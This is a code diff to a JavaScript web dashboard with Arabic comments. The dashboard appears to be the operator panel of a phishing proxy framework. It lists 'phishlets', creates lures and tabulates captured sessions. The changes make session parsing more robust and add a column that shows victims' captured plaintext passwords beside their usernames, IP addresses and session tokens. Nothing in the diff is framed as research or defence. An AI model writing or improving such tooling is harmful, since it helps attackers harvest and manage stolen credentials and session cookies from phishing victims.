@@ -191,9 +191,41 @@ async function fetchSessions() {
         }
         
         const result = await response.json();
+        console.log('استجابة API الأصلية للجلسات:', result);
+        
         // تجهيز البيانات بالتنسيق المناسب
-        sessions = Array.isArray(result) ? result : (result.data || []);
-        console.log('تم استلام Sessions:', sessions);
+        // تحقق من تنسيق البيانات المستلمة وتحويلها إلى تنسيق موحد
+        sessions = [];
+        
+        if (Array.isArray(result)) {
+            sessions = result;
+        } else if (result.data && Array.isArray(result.data)) {
+            sessions = result.data;
+        } else if (typeof result === 'object') {
+            // إذا كان الرد كائن يحتوي على جلسات
+            const possibleArrayKeys = ['sessions', 'data', 'records', 'items'];
+            for (const key of possibleArrayKeys) {
+                if (result[key] && Array.isArray(result[key])) {
+                    sessions = result[key];
+                    break;
+                }
+            }
+            
+            // إذا لم نجد مصفوفة، ربما البيانات مخزنة كقيم في الكائن
+            if (sessions.length === 0) {
+                const sessionIds = Object.keys(result);
+                sessions = sessionIds.map(id => {
+                    const session = result[id];
+                    if (typeof session === 'object') {
+                        session.id = id;
+                        return session;
+                    }
+                    return null;
+                }).filter(session => session !== null);
+            }
+        }
+        
+        console.log('البيانات المعالجة للجلسات:', sessions);
         return sessions;
     } catch (error) {
         console.error('خطأ في جلب Sessions:', error);
@@ -340,7 +372,7 @@ function populateRecentSessionsTable(tableElement, sessions) {
     const tbody = tableElement.querySelector('tbody');
     tbody.innerHTML = '';
     
-    if (sessions.length === 0) {
+    if (!sessions || sessions.length === 0) {
         const tr = document.createElement('tr');
         tr.innerHTML = `<td colspan="5" class="text-center">لا توجد جلسات مسجلة</td>`;
         tbody.appendChild(tr);
@@ -348,13 +380,20 @@ function populateRecentSessionsTable(tableElement, sessions) {
     }
     
     sessions.forEach(session => {
+        // التأكد من وجود كافة البيانات الضرورية
+        const sessionId = session.id || session.session_id || session.SessionId || '';
+        const phishlet = session.phishlet || '';
+        const username = session.username || session.user || session.login || 'غير مسجل';
+        const ip = session.remote_addr || session.ip || session.remote_ip || '';
+        const created = session.created || session.timestamp || session.time || '';
+        
         const tr = document.createElement('tr');
         tr.innerHTML = `
-            <td>${session.id}</td>
-            <td>${session.phishlet}</td>
-            <td>${session.username || 'غير مسجل'}</td>
-            <td>${session.remote_addr}</td>
-            <td>${formatDate(session.created)}</td>
+            <td>${sessionId}</td>
+            <td>${phishlet}</td>
+            <td>${username}</td>
+            <td>${ip}</td>
+            <td>${formatDate(created)}</td>
         `;
         tbody.appendChild(tr);
     });
@@ -465,24 +504,36 @@ function populateSessionsTable(sessions) {
     const tbody = sessionsTable.querySelector('tbody');
     tbody.innerHTML = '';
     
-    if (sessions.length === 0) {
+    if (!sessions || sessions.length === 0) {
         const tr = document.createElement('tr');
-        tr.innerHTML = `<td colspan="6" class="text-center">لا توجد جلسات مسجلة</td>`;
+        tr.innerHTML = `<td colspan="7" class="text-center">لا توجد جلسات مسجلة</td>`;
         tbody.appendChild(tr);
         return;
     }
     
+    console.log('بيانات الجلسات الكاملة:', sessions);
+    
     sessions.forEach(session => {
-        const hasCredentials = session.tokens && Object.keys(session.tokens).length > 0;
+        // التأكد من وجود كافة البيانات الضرورية
+        const sessionId = session.id || session.session_id || session.SessionId || '';
+        const phishlet = session.phishlet || '';
+        const username = session.username || session.user || session.login || 'غير مسجل';
+        const password = session.password || session.pass || 'غير مسجل';
+        const ip = session.remote_addr || session.ip || session.remote_ip || '';
+        const created = session.created || session.timestamp || session.time || '';
+        const hasCredentials = (session.tokens && Object.keys(session.tokens).length > 0) || 
+                            username !== 'غير مسجل' || password !== 'غير مسجل';
+        
         const tr = document.createElement('tr');
         tr.innerHTML = `
-            <td>${session.id}</td>
-            <td>${session.phishlet}</td>
-            <td>${session.username || 'غير مسجل'}</td>
-            <td>${session.remote_addr}</td>
-            <td>${formatDate(session.created)}</td>
+            <td>${sessionId}</td>
+            <td>${phishlet}</td>
+            <td>${username}</td>
+            <td>${password}</td>
+            <td>${ip}</td>
+            <td>${formatDate(created)}</td>
             <td class="action-buttons">
-                <button class="btn btn-sm btn-primary" data-action="view" data-id="${session.id}">
+                <button class="btn btn-sm btn-primary" data-action="view" data-id="${sessionId}">
                     <i class="fas fa-eye"></i> عرض
                 </button>
                 ${hasCredentials ? `<span class="badge badge-success">بيانات اعتماد</span>` : ''}
@@ -686,8 +737,30 @@ async function showCreateLureModal() {
 
 // تنسيق التاريخ
 function formatDate(dateString) {
-    const date = new Date(dateString);
-    return date.toLocaleString('ar-SA');
+    if (!dateString) return 'غير متوفر';
+    
+    try {
+        // محاولة إنشاء كائن تاريخ
+        const date = new Date(dateString);
+        
+        // التحقق من صحة التاريخ
+        if (isNaN(date.getTime())) {
+            return 'تاريخ غير صالح';
+        }
+        
+        // تنسيق التاريخ بشكل صحيح
+        return date.toLocaleString('ar-SA', {
+            year: 'numeric',
+            month: 'numeric',
+            day: 'numeric',
+            hour: '2-digit',
+            minute: '2-digit',
+            second: '2-digit'
+        });
+    } catch (error) {
+        console.error('خطأ في تنسيق التاريخ:', error);
+        return 'تاريخ غير صالح';
+    }
 }
 
 // ================= Event Handlers =================
